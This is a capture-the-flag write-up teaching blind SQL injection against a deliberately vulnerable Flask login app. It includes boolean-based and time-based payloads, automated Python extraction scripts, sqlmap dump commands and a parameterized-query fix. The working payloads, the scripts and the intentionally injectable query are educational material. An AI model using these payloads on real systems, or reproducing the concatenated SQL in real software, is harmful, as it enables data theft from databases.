---
title: "Web - Blind SQL Injection"
description: "Extracting a flag character by character using boolean-based and time-based blind SQL injection techniques against a login form."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Medium             |
| Points     | 300                |
| Flag       | `zemi{bl1nd_sqli_b1t_by_b1t}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-blind-sqli/app.py)
- [flag.txt](/Website/challenges/web-blind-sqli/flag.txt)
- [README.md](/Website/challenges/web-blind-sqli/README.md)
- [requirements.txt](/Website/challenges/web-blind-sqli/requirements.txt)
- [setup.py](/Website/challenges/web-blind-sqli/setup.py)

## Overview

In classic SQL injection, you can see the query results directly in the page (in-band SQLi). But what happens when the application does not display query results or error messages? That is blind SQL injection. The data is still there — you just have to extract it one bit at a time by asking the database yes/no questions and observing how the application responds.

There are two main types:
- **Boolean-based blind SQLi**: You infer data by observing different responses (e.g., "Login successful" vs. "Login failed")
- **Time-based blind SQLi**: You infer data by observing response times (e.g., if the response takes 5 seconds, the condition was true)

## Setting Up the Challenge Locally

Save the following as `app.py` and run it with `python3 app.py`:

```python
from flask import Flask, request, jsonify, render_template_string
import sqlite3
import os

app = Flask(__name__)
DB_PATH = "challenge.db"

def init_db():
    """Initialize the database with users and a secrets table."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, flag TEXT)")
    c.execute("DELETE FROM users")
    c.execute("DELETE FROM secrets")
    c.execute("INSERT INTO users VALUES (1, 'admin', 'sup3rs3cur3p4ss')")
    c.execute("INSERT INTO users VALUES (2, 'guest', 'guest')")
    c.execute("INSERT INTO secrets VALUES (1, 'zemi{bl1nd_sqli_b1t_by_b1t}')")
    conn.commit()
    conn.close()

PAGE = """
<!DOCTYPE html>
<html>
<head><title>Blind Login</title></head>
<body>
  <h1>Login Portal</h1>
  <form method="POST" action="/login">
    <label>Username:</label><br>
    <input type="text" name="username"><br>
    <label>Password:</label><br>
    <input type="password" name="password"><br><br>
    <button type="submit">Login</button>
  </form>
  {% if message %}
  <p><strong>{{ message }}</strong></p>
  {% endif %}
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(PAGE)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    # VULNERABLE: String concatenation in SQL query
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    c.execute(query)
    result = c.fetchone()
    conn.close()

    if result:
        # Application only says "success" or "failed" — no data is displayed
        message = "Login successful! Welcome back."
    else:
        message = "Invalid username or password."

    return render_template_string(PAGE, message=message)

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000)
```

The app runs at `http://localhost:5000`. Notice that successful login only shows "Login successful!" — it never displays database contents on the page. This is why we need blind techniques.

## Reconnaissance

### Step 1: Confirm SQL injection exists

```bash
# Normal login attempt
curl -s -X POST http://localhost:5000/login -d "username=guest&password=guest"
# Response contains: "Login successful!"

# Test with a single quote
curl -s -X POST http://localhost:5000/login -d "username='&password=test"
# Response may show an error or just "Invalid username or password."
```

### Step 2: Confirm boolean-based blind SQLi

We can use a conditional injection. If we inject a condition that is true, we get "Login successful." If false, we get "Invalid."

```bash
# TRUE condition — should show "Login successful"
curl -s -X POST http://localhost:5000/login \
  -d "username=guest' AND 1=1--&password=x"

# FALSE condition — should show "Invalid"
curl -s -X POST http://localhost:5000/login \
  -d "username=guest' AND 1=2--&password=x"
```

If these produce different responses, we have confirmed boolean-based blind SQL injection. The `--` comments out the password check, and `AND 1=1` vs `AND 1=2` controls whether a row is returned.

## Exploitation — Boolean-Based Blind SQLi

### Step 1: Discover table names

We need to find where the flag is stored. SQLite stores schema information in `sqlite_master`:

```bash
# Check if a table named 'secrets' exists (1st character = 's')
curl -s -X POST http://localhost:5000/login \
  -d "username=guest' AND (SELECT SUBSTR(name,1,1) FROM sqlite_master WHERE type='table' AND name != 'users' LIMIT 1)='s'--&password=x"
```

If the response says "Login successful," the first character of the other table name is `s`.

### Step 2: Extract the flag character by character

The technique: use `SUBSTR()` to extract one character at a time from the flag and compare it against known characters.

```bash
# Is the 1st character of the flag 'z'?
curl -s -X POST http://localhost:5000/login \
  -d "username=guest' AND (SELECT SUBSTR(flag,1,1) FROM secrets LIMIT 1)='z'--&password=x"
# Response: "Login successful!" — YES, it's 'z'

# Is the 2nd character 'e'?
curl -s -X POST http://localhost:5000/login \
  -d "username=guest' AND (SELECT SUBSTR(flag,2,1) FROM secrets LIMIT 1)='e'--&password=x"
# Response: "Login successful!" — YES, it's 'e'
```

### Automated extraction script

Doing this manually for every character would take forever. Here is a Python script to automate it:

```python
#!/usr/bin/env python3
"""Boolean-based blind SQLi extraction script."""

import requests
import string
import sys

TARGET = "http://localhost:5000/login"
CHARSET = string.printable.strip()
SUCCESS_INDICATOR = "Login successful"

def check_condition(condition):
    """Inject a condition and return True if it evaluated to true."""
    payload = f"guest' AND ({condition})--"
    resp = requests.post(TARGET, data={"username": payload, "password": "x"})
    return SUCCESS_INDICATOR in resp.text

def extract_string(query, max_length=50):
    """Extract a string from the database character by character."""
    result = ""
    for pos in range(1, max_length + 1):
        found = False
        for char in CHARSET:
            condition = f"SELECT SUBSTR(({query}),{pos},1)='{char}'"
            if check_condition(condition):
                result += char
                sys.stdout.write(f"\r[+] Extracted: {result}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            break  # No character matched — we've reached the end
    print()
    return result

# Step 1: Get table names
print("[*] Extracting table names...")
tables = extract_string(
    "SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'"
)
print(f"[+] Tables: {tables}")

# Step 2: Get column names from 'secrets'
print("\n[*] Extracting columns from 'secrets'...")
columns = extract_string(
    "SELECT GROUP_CONCAT(name) FROM pragma_table_info('secrets')"
)
print(f"[+] Columns: {columns}")

# Step 3: Extract the flag
print("\n[*] Extracting flag...")
flag = extract_string("SELECT flag FROM secrets LIMIT 1")
print(f"\n[+] FLAG: {flag}")
```

Running it:

```bash
python3 blind_extract.py
```

Output:

```
[*] Extracting table names...
[+] Extracted: users,secrets
[+] Tables: users,secrets

[*] Extracting columns from 'secrets'...
[+] Extracted: id,flag
[+] Columns: id,flag

[*] Extracting flag...
[+] Extracted: zemi{bl1nd_sqli_b1t_by_b1t}

[+] FLAG: zemi{bl1nd_sqli_b1t_by_b1t}
```

### Optimizing with binary search

Instead of checking every printable character linearly, use binary search on ASCII values to reduce the number of requests:

```python
def extract_string_binary(query, max_length=50):
    """Extract a string using binary search on ASCII values (faster)."""
    result = ""
    for pos in range(1, max_length + 1):
        low, high = 32, 126  # Printable ASCII range
        found = False
        while low <= high:
            mid = (low + high) // 2
            # Is the character's ASCII value > mid?
            condition = f"SELECT UNICODE(SUBSTR(({query}),{pos},1))>{mid}"
            if check_condition(condition):
                low = mid + 1
            else:
                high = mid - 1

        char = chr(low)
        # Verify the character
        condition = f"SELECT SUBSTR(({query}),{pos},1)='{char}'"
        if check_condition(condition):
            result += char
            sys.stdout.write(f"\r[+] Extracted: {result}")
            sys.stdout.flush()
            found = True
        else:
            break

    print()
    return result
```

This reduces requests per character from ~95 (linear search through printable characters) to ~7 (log2 of 95).

## Exploitation — Time-Based Blind SQLi

Time-based blind SQLi is used when the application returns the exact same response regardless of the query result — there is no observable boolean difference. Instead, we inject a conditional `SLEEP` or delay and measure response time.

### SQLite does not have a built-in SLEEP function, but we can simulate delays

For SQLite, use a computationally expensive operation like `LIKE` with wildcards on a large string:

```bash
# Time-based check: if the 1st character of the flag is 'z', the response will be slow
curl -s -o /dev/null -w "Time: %{time_total}s\n" \
  -X POST http://localhost:5000/login \
  -d "username=guest' AND CASE WHEN (SELECT SUBSTR(flag,1,1) FROM secrets)='z' THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 1 END--&password=x"
```

For MySQL, you would use `SLEEP()`:

```sql
' AND IF(SUBSTR((SELECT flag FROM secrets),1,1)='z', SLEEP(3), 0)--
```

For PostgreSQL, use `pg_sleep()`:

```sql
' AND CASE WHEN SUBSTR((SELECT flag FROM secrets),1,1)='z' THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

### Time-based extraction script

```python
#!/usr/bin/env python3
"""Time-based blind SQLi extraction (MySQL example)."""

import requests
import string
import time
import sys

TARGET = "http://localhost:5000/login"
CHARSET = string.printable.strip()
DELAY_THRESHOLD = 2.0  # Seconds — if response takes longer, condition was true

def check_time_condition(condition, delay=3):
    """Inject a time-based condition and measure the response time."""
    # This payload is for MySQL. Adjust for your target database.
    payload = f"guest' AND IF({condition}, SLEEP({delay}), 0)--"
    start = time.time()
    requests.post(TARGET, data={"username": payload, "password": "x"}, timeout=delay + 5)
    elapsed = time.time() - start
    return elapsed >= DELAY_THRESHOLD

def extract_string_time(query, max_length=50):
    """Extract a string using time-based blind SQLi."""
    result = ""
    for pos in range(1, max_length + 1):
        found = False
        for char in CHARSET:
            condition = f"SUBSTR(({query}),{pos},1)='{char}'"
            if check_time_condition(condition):
                result += char
                sys.stdout.write(f"\r[+] Extracted: {result}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    print()
    return result

print("[*] Extracting flag (time-based)...")
flag = extract_string_time("SELECT flag FROM secrets LIMIT 1")
print(f"\n[+] FLAG: {flag}")
```

> **Note:** Time-based blind SQLi is much slower than boolean-based because each check requires waiting for the delay. A 28-character flag could take hundreds of requests.

## Using sqlmap for Automated Extraction

[sqlmap](https://github.com/sqlmapproject/sqlmap) automates all of this. Run it against the local challenge:

```bash
# Basic detection
sqlmap -u "http://localhost:5000/login" \
  --data="username=guest&password=x" \
  --method=POST \
  -p username \
  --batch

# Enumerate databases
sqlmap -u "http://localhost:5000/login" \
  --data="username=guest&password=x" \
  -p username \
  --tables \
  --batch

# Dump the secrets table
sqlmap -u "http://localhost:5000/login" \
  --data="username=guest&password=x" \
  -p username \
  -T secrets \
  --dump \
  --batch

# Specify technique (B=boolean, T=time-based)
sqlmap -u "http://localhost:5000/login" \
  --data="username=guest&password=x" \
  -p username \
  --technique=B \
  -T secrets \
  --dump \
  --batch
```

sqlmap output:

```
Database: SQLite
Table: secrets
[1 entry]
+----+-----------------------------+
| id | flag                        |
+----+-----------------------------+
| 1  | zemi{bl1nd_sqli_b1t_by_b1t} |
+----+-----------------------------+
```

## Comparison: In-Band vs. Blind SQLi

| Aspect | In-Band (Classic) | Boolean-Based Blind | Time-Based Blind |
|--------|-------------------|---------------------|------------------|
| Data visible in response? | Yes | No | No |
| How data is inferred | Directly displayed | True/false response difference | Response time delay |
| Speed | Fast (full rows per query) | Moderate (~7-95 requests per character) | Slow (delay per check) |
| Detection difficulty | Easy | Moderate | Hard |
| When to use | Error messages or UNION output visible | Different pages for true/false | Identical response for everything |

## The Vulnerable Code (Explained)

```python
@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    # VULNERABLE: f-string directly in the SQL query.
    # The user controls the WHERE clause.
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    c.execute(query)
```

## The Fix

Use parameterized queries. The database driver handles escaping, making injection impossible:

```python
@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    # SAFE: Parameterized query — the ? placeholders are handled by the driver.
    # User input is NEVER part of the SQL syntax.
    c.execute(
        "SELECT * FROM users WHERE username = ? AND password = ?",
        (username, password)
    )
    result = c.fetchone()
    conn.close()

    if result:
        message = "Login successful! Welcome back."
    else:
        message = "Invalid username or password."

    return render_template_string(PAGE, message=message)
```

With parameterized queries, even if the user enters `' OR 1=1--`, it is treated as the literal string `' OR 1=1--` and compared against usernames in the database — it never becomes part of the SQL syntax.

## Tools Used

- **curl** — sending crafted injection payloads
- **Python + requests** — automated character-by-character extraction scripts
- **sqlmap** — automated SQL injection detection and data extraction
- **Burp Suite Intruder** — (optional) manually fuzzing injection points
- **Browser DevTools** — inspecting form parameters and responses

## Lessons Learned

- Blind SQL injection is just as dangerous as classic SQLi — the attacker can extract the entire database; it just takes more requests
- Boolean-based blind SQLi relies on observing different application responses for true vs. false conditions
- Time-based blind SQLi relies on measuring response delays — use it when there is no observable difference in responses
- Binary search dramatically reduces the number of requests needed per character (from ~95 to ~7)
- **Always** use parameterized queries or prepared statements — this is the definitive fix for all forms of SQL injection
- sqlmap automates blind SQLi extraction and supports both boolean-based and time-based techniques out of the box
- Even if an application does not display errors or query results, it may still be vulnerable — never assume that hiding output prevents exploitation
